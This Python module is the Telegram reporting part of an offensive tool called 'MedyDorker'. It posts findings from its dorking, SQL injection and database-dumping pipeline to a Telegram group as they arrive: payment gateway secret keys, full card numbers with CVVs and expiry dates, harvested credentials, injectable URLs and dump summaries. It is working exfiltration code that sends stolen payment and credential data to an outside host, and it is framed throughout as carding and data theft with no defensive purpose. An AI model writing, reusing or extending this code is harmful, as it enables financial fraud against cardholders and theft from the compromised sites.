"""
Telegram Reporter — Real-time group posting for all findings

Posts categorized findings to a Telegram group:
- 🔑 GATEWAY — Stripe/Braintree/PayPal keys
- 💳 CARD DATA — Card numbers, CVVs, expiry dates
- 🔓 SQLi VULN — SQL injection vulnerabilities
- 📦 DATA DUMP — Database extraction results
- 🔐 SECRET — API keys, credentials, connection strings
- 📊 STATUS — Periodic stats updates
"""

import asyncio
import html
import json
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from loguru import logger

try:
    from telegram import Bot
    from telegram.constants import ParseMode
    HAS_TELEGRAM = True
except ImportError:
    try:
        import aiohttp
        HAS_TELEGRAM = False
    except ImportError:
        raise ImportError("Install python-telegram-bot or aiohttp")


@dataclass
class ReporterStats:
    """Cumulative reporting statistics."""
    gateways_found: int = 0
    card_data_found: int = 0
    sqli_vulns_found: int = 0
    data_dumps: int = 0
    secrets_found: int = 0
    b3_cookies_found: int = 0
    gateway_cookies_found: int = 0
    commerce_cookies_found: int = 0
    urls_scanned: int = 0
    dorks_processed: int = 0
    messages_sent: int = 0
    errors: int = 0
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())


class TelegramReporter:
    """Posts findings to Telegram group in real-time."""

    def __init__(self, bot_token: str, chat_id: str, 
                 rate_limit: float = 1.0, batch_size: int = 5):
        """Initialize the reporter.
        
        Args:
            bot_token: Telegram bot token
            chat_id: Target chat/group ID
            rate_limit: Minimum seconds between messages
            batch_size: Messages to batch before sending
        """
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.rate_limit = rate_limit
        self.batch_size = batch_size
        self.stats = ReporterStats()
        self._queue: asyncio.Queue = asyncio.Queue()
        self._running = False
        self._last_send = 0
        
        if HAS_TELEGRAM:
            self.bot = Bot(token=bot_token)
        else:
            self.bot = None
            self.api_url = f"https://api.telegram.org/bot{bot_token}"

    async def _send_message(self, text: str, parse_mode: str = "HTML", 
                            disable_preview: bool = True) -> bool:
        """Send a single message to the chat."""
        try:
            # Rate limiting
            now = asyncio.get_event_loop().time()
            elapsed = now - self._last_send
            if elapsed < self.rate_limit:
                await asyncio.sleep(self.rate_limit - elapsed)
            
            if HAS_TELEGRAM:
                await self.bot.send_message(
                    chat_id=self.chat_id,
                    text=text[:4096],  # Telegram limit
                    parse_mode=parse_mode,
                    disable_web_page_preview=disable_preview,
                )
            else:
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"{self.api_url}/sendMessage",
                        json={
                            "chat_id": self.chat_id,
                            "text": text[:4096],
                            "parse_mode": parse_mode,
                            "disable_web_page_preview": disable_preview,
                        }
                    ) as resp:
                        if resp.status != 200:
                            error = await resp.text()
                            logger.error(f"Telegram API error: {error}")
                            return False
            
            self._last_send = asyncio.get_event_loop().time()
            self.stats.messages_sent += 1
            return True
        
        except Exception as e:
            logger.error(f"Failed to send Telegram message: {e}")
            self.stats.errors += 1
            return False

    async def _send_long_message(self, text: str, parse_mode: str = "HTML"):
        """Send a long message, splitting into chunks if needed."""
        if len(text) <= 4096:
            await self._send_message(text, parse_mode)
            return
        
        # Split on newlines respecting the 4096 limit
        chunks = []
        current = ""
        for line in text.split("\n"):
            if len(current) + len(line) + 1 > 4000:
                chunks.append(current)
                current = line
            else:
                current += "\n" + line if current else line
        if current:
            chunks.append(current)
        
        for i, chunk in enumerate(chunks):
            if len(chunks) > 1:
                chunk = f"[{i+1}/{len(chunks)}]\n{chunk}"
            await self._send_message(chunk, parse_mode)

    # ==================== REPORT METHODS ====================

    async def report_gateway(self, url: str, key_type: str, key_value: str,
                             extra: Dict = None):
        """Report a found payment gateway key.
        
        Args:
            url: Source URL
            key_type: Type of key (stripe_pk, stripe_sk, etc.)
            key_value: The actual key value
            extra: Additional info
        """
        self.stats.gateways_found += 1
        
        icon = "🔑"
        if "sk" in key_type.lower() or "secret" in key_type.lower():
            icon = "🔥"  # Extra important for secret keys
        
        text = (
            f"{icon} <b>GATEWAY KEY FOUND</b> {icon}\n"
            f"\n"
            f"<b>Type:</b> {html.escape(key_type)}\n"
            f"<b>Key:</b> <code>{html.escape(key_value)}</code>\n"
            f"<b>Source:</b> <code>{html.escape(url)}</code>\n"
            f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
        )
        
        if extra:
            for k, v in extra.items():
                text += f"<b>{html.escape(str(k))}:</b> {html.escape(str(v))}\n"
        
        text += f"\n#{key_type.replace('_', '')} #gateway #{self.stats.gateways_found}"
        
        await self._send_message(text)

    async def report_card_data(self, url: str, cards: List[Dict]):
        """Report found card data.
        
        Args:
            url: Source URL
            cards: List of card data dictionaries
        """
        self.stats.card_data_found += len(cards)
        
        text = (
            f"💳 <b>CARD DATA FOUND</b> 💳\n"
            f"\n"
            f"<b>Source:</b> <code>{html.escape(url)}</code>\n"
            f"<b>Count:</b> {len(cards)} entries\n"
            f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"\n"
        )
        
        for i, card in enumerate(cards[:20], 1):  # Max 20 in one message
            text += f"<b>#{i}</b>\n"
            for key, value in card.items():
                text += f"  {html.escape(str(key))}: <code>{html.escape(str(value))}</code>\n"
            text += "\n"
        
        if len(cards) > 20:
            text += f"\n... and {len(cards) - 20} more entries"
        
        text += f"\n#carddata #dump #{self.stats.card_data_found}"
        
        await self._send_long_message(text)

    async def report_sqli_vuln(self, url: str, param: str, dbms: str,
                                injection_type: str, details: Dict = None):
        """Report a SQL injection vulnerability.
        
        Args:
            url: Vulnerable URL
            param: Vulnerable parameter
            dbms: Database type
            injection_type: Type of injection
            details: Additional details
        """
        self.stats.sqli_vulns_found += 1
        
        text = (
            f"🔓 <b>SQLi VULNERABLE</b> 🔓\n"
            f"\n"
            f"<b>URL:</b> <code>{html.escape(url)}</code>\n"
            f"<b>Parameter:</b> <code>{html.escape(param)}</code>\n"
            f"<b>DBMS:</b> {html.escape(dbms)}\n"
            f"<b>Type:</b> {html.escape(injection_type)}\n"
        )
        
        if details:
            if details.get("db_version"):
                text += f"<b>Version:</b> <code>{html.escape(details['db_version'])}</code>\n"
            if details.get("current_db"):
                text += f"<b>Database:</b> <code>{html.escape(details['current_db'])}</code>\n"
            if details.get("current_user"):
                text += f"<b>User:</b> <code>{html.escape(details['current_user'])}</code>\n"
            if details.get("column_count"):
                text += f"<b>Columns:</b> {details['column_count']}\n"
            if details.get("tables"):
                tables_str = ", ".join(details["tables"][:20])
                text += f"<b>Tables:</b> <code>{html.escape(tables_str)}</code>\n"
        
        text += (
            f"\n<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"#sqli #{dbms} #{injection_type} #{self.stats.sqli_vulns_found}"
        )
        
        await self._send_message(text)

    async def report_data_dump(self, url: str, dbms: str, database: str,
                                tables: Dict[str, List[str]], 
                                row_counts: Dict[str, int],
                                saved_files: Dict[str, str]):
        """Report a completed data dump.
        
        Args:
            url: Source URL  
            dbms: Database type
            database: Database name
            tables: {table: [columns]}
            row_counts: {table: row_count}
            saved_files: {type: filepath}
        """
        self.stats.data_dumps += 1
        
        total_rows = sum(row_counts.values())
        
        text = (
            f"📦 <b>DATA DUMP COMPLETE</b> 📦\n"
            f"\n"
            f"<b>Source:</b> <code>{html.escape(url)}</code>\n"
            f"<b>DBMS:</b> {html.escape(dbms)}\n"
            f"<b>Database:</b> <code>{html.escape(database)}</code>\n"
            f"<b>Tables:</b> {len(tables)}\n"
            f"<b>Total Rows:</b> {total_rows}\n"
            f"\n"
        )
        
        # Table summary
        for table, columns in list(tables.items())[:10]:
            count = row_counts.get(table, 0)
            cols_str = ", ".join(columns[:8])
            if len(columns) > 8:
                cols_str += f" +{len(columns) - 8} more"
            text += f"📋 <b>{html.escape(table)}</b> ({count} rows)\n"
            text += f"   <i>{html.escape(cols_str)}</i>\n"
        
        if len(tables) > 10:
            text += f"\n... and {len(tables) - 10} more tables"
        
        # Saved files
        if saved_files:
            text += "\n\n<b>Saved Files:</b>\n"
            for ftype, fpath in saved_files.items():
                text += f"  📁 {html.escape(ftype)}: <code>{html.escape(fpath)}</code>\n"
        
        text += f"\n#datadump #{dbms} #{self.stats.data_dumps}"
        
        await self._send_long_message(text)

    async def report_secret(self, url: str, secret_type: str, 
                            secret_name: str, secret_value: str,
                            category: str = ""):
        """Report a found secret/key.
        
        Args:
            url: Source URL
            secret_type: Type identifier
            secret_name: Human-readable name
            secret_value: The actual value
            category: Category (gateway, cloud, database, etc.)
        """
        self.stats.secrets_found += 1
        
        category_icons = {
            "gateway": "🔑",
            "cloud": "☁️",
            "database": "🗄️",
            "api": "🔗",
            "credential": "🔐",
        }
        icon = category_icons.get(category, "📌")
        
        text = (
            f"{icon} <b>SECRET FOUND</b> {icon}\n"
            f"\n"
            f"<b>Type:</b> {html.escape(secret_name)}\n"
            f"<b>Category:</b> {html.escape(category)}\n"
            f"<b>Value:</b> <code>{html.escape(secret_value)}</code>\n"
            f"<b>Source:</b> <code>{html.escape(url)}</code>\n"
            f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"\n#{secret_type} #{category} #{self.stats.secrets_found}"
        )
        
        await self._send_message(text)

    async def report_status(self, extra_info: Dict = None):
        """Send periodic status update.
        
        Args:
            extra_info: Additional info to include
        """
        uptime = datetime.now() - datetime.fromisoformat(self.stats.start_time)
        hours = int(uptime.total_seconds() // 3600)
        minutes = int((uptime.total_seconds() % 3600) // 60)
        
        text = (
            f"📊 <b>MedyDorker v3.5 STATUS</b> 📊\n"
            f"\n"
            f"⏱ <b>Uptime:</b> {hours}h {minutes}m\n"
            f"🔍 <b>URLs Scanned:</b> {self.stats.urls_scanned}\n"
            f"🎯 <b>Dorks Processed:</b> {self.stats.dorks_processed}\n"
            f"\n"
            f"<b>Findings:</b>\n"
            f"  🔑 Gateways: {self.stats.gateways_found}\n"
            f"  💳 Card Data: {self.stats.card_data_found}\n"
            f"  🔓 SQLi Vulns: {self.stats.sqli_vulns_found}\n"
            f"  📦 Data Dumps: {self.stats.data_dumps}\n"
            f"  🔐 Secrets: {self.stats.secrets_found}\n"
            f"\n"
            f"<b>Cookie Hunt:</b>\n"
            f"  🔵 B3 Cookies: {self.stats.b3_cookies_found}\n"
            f"  🏦 Gateway Cookies: {self.stats.gateway_cookies_found}\n"
            f"  🛒 Commerce Cookies: {self.stats.commerce_cookies_found}\n"
            f"\n"
            f"📨 <b>Messages Sent:</b> {self.stats.messages_sent}\n"
            f"❌ <b>Errors:</b> {self.stats.errors}\n"
        )
        
        if extra_info:
            text += "\n<b>Extra:</b>\n"
            for k, v in extra_info.items():
                text += f"  {html.escape(str(k))}: {html.escape(str(v))}\n"
        
        text += f"\n#status #{datetime.now().strftime('%Y%m%d')}"
        
        await self._send_message(text)

    async def report_startup(self, config_info: Dict = None):
        """Send startup notification."""
        text = (
            f"🚀 <b>MedyDorker v3.0 STARTED</b> 🚀\n"
            f"\n"
            f"<b>Pipeline:</b> Dorker → Scanner → Exploiter → Dumper → Reporter\n"
            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        )
        
        if config_info:
            text += "\n<b>Configuration:</b>\n"
            for k, v in config_info.items():
                text += f"  {html.escape(str(k))}: {html.escape(str(v))}\n"
        
        text += "\n#startup #medydorker #v3"
        
        await self._send_message(text)

    async def report_error(self, error_msg: str, context: str = ""):
        """Report an error."""
        text = (
            f"⚠️ <b>ERROR</b>\n"
            f"\n"
            f"<b>Message:</b> {html.escape(error_msg[:500])}\n"
        )
        if context:
            text += f"<b>Context:</b> {html.escape(context[:200])}\n"
        
        text += f"<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        
        await self._send_message(text)

    # ==================== BATCH QUEUE SYSTEM ====================

    async def start_queue_worker(self):
        """Start the background queue worker for batched sending."""
        self._running = True
        logger.info("Reporter queue worker started")
        
        while self._running:
            try:
                # Collect messages from queue
                messages = []
                try:
                    while len(messages) < self.batch_size:
                        msg = await asyncio.wait_for(self._queue.get(), timeout=5.0)
                        messages.append(msg)
                except asyncio.TimeoutError:
                    pass
                
                # Send collected messages
                for msg in messages:
                    await self._send_message(msg)
            
            except Exception as e:
                logger.error(f"Queue worker error: {e}")
                await asyncio.sleep(5)
        
        logger.info("Reporter queue worker stopped")

    def queue_message(self, text: str):
        """Add a message to the send queue."""
        self._queue.put_nowait(text)

    def stop(self):
        """Stop the queue worker."""
        self._running = False

    def get_stats(self) -> Dict:
        """Get current stats as dictionary."""
        return {
            "gateways_found": self.stats.gateways_found,
            "card_data_found": self.stats.card_data_found,
            "sqli_vulns_found": self.stats.sqli_vulns_found,
            "data_dumps": self.stats.data_dumps,
            "secrets_found": self.stats.secrets_found,
            "b3_cookies_found": self.stats.b3_cookies_found,
            "gateway_cookies_found": self.stats.gateway_cookies_found,
            "commerce_cookies_found": self.stats.commerce_cookies_found,
            "urls_scanned": self.stats.urls_scanned,
            "dorks_processed": self.stats.dorks_processed,
            "messages_sent": self.stats.messages_sent,
            "errors": self.stats.errors,
            "start_time": self.stats.start_time,
        }
